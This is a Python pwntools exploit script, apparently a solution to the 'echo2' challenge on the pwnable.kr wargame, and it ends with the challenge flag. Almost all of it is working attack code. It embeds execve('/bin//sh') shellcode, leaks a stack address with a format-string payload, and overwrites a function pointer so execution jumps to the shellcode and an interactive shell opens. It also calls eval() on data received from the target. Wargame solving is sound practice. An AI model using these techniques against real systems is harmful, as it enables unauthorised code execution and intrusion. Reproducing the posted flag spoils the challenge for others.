#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# ----------------- #
# Config / defaults #
# ----------------- #
context.log_level = "info"
REMOTE_USER = "echo2"
REMOTE_HOST = "pwnable.kr"
REMOTE_SSH_PORT = 2222
REMOTE_NC_CMD = "nc 0 9011"

### defines ###
USERNAME = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
USER_MSG = b"hello " + USERNAME + b'\n'

### Helpers ###
def option(io: tube, op: int):
    io.sendlineafter(b'> ', str(op).encode())

def leak_stack(io: tube):
    payload = b"%p %p %p %p %p %p %p %p %p %p"
    option(io, 2)
    io.sendlineafter(USER_MSG, payload)
    line = io.recvline().decode()
    leaks = line.replace('\n', '').split(' ')
    log.info(f"stack: {leaks[-1]}")
    return eval(leaks[-1])

def exec_arbitrary_addr(io: tube, addr: int):
    option(io, 4)
    io.sendline(b'n')
    option(io, 3)
    io.sendline(b'a' * 24 + p64(addr))


def start_local(exe_path: str = "./echo2", use_gdb: bool = False):
    if use_gdb:
        return gdb.debug([exe_path], gdbscript='tbreak main\ncontinue\n')
    return process([exe_path])

def start_ssh_nc(user: str, host: str, ssh_port: int, nc_cmd: str,
                 keyfile: str = None, password: str = None):
    log.info(f"ssh -> {user}@{host}:{ssh_port} ; running: {nc_cmd}")
    ssh_client = ssh(user, host, port=ssh_port, keyfile=keyfile, password=password)
    io = ssh_client.run(nc_cmd, tty=True)
    io.ssh_client = ssh_client
    return io

def main():
    exe_path = args.EXE or "./echo2"
    use_ssh = args.SSH
    keyfile = args.KEY or None
    password = args.PASSWORD or 'guest'
    use_gdb = args.GDB
    use_local_flag = args.LOCAL

    if use_ssh:
        io = start_ssh_nc(REMOTE_USER, REMOTE_HOST, REMOTE_SSH_PORT, REMOTE_NC_CMD,
                          keyfile=keyfile, password=password)
    else:
        io = start_local(exe_path, use_gdb=use_gdb)

# -- Exploit goes here --
    io.sendline(USERNAME)

    stack = leak_stack(io)
    exec_arbitrary_addr(io, stack - 0x20)

    io.interactive()

if __name__ == "__main__":
    main()

#flag: w3_want_ex3cutable_5tack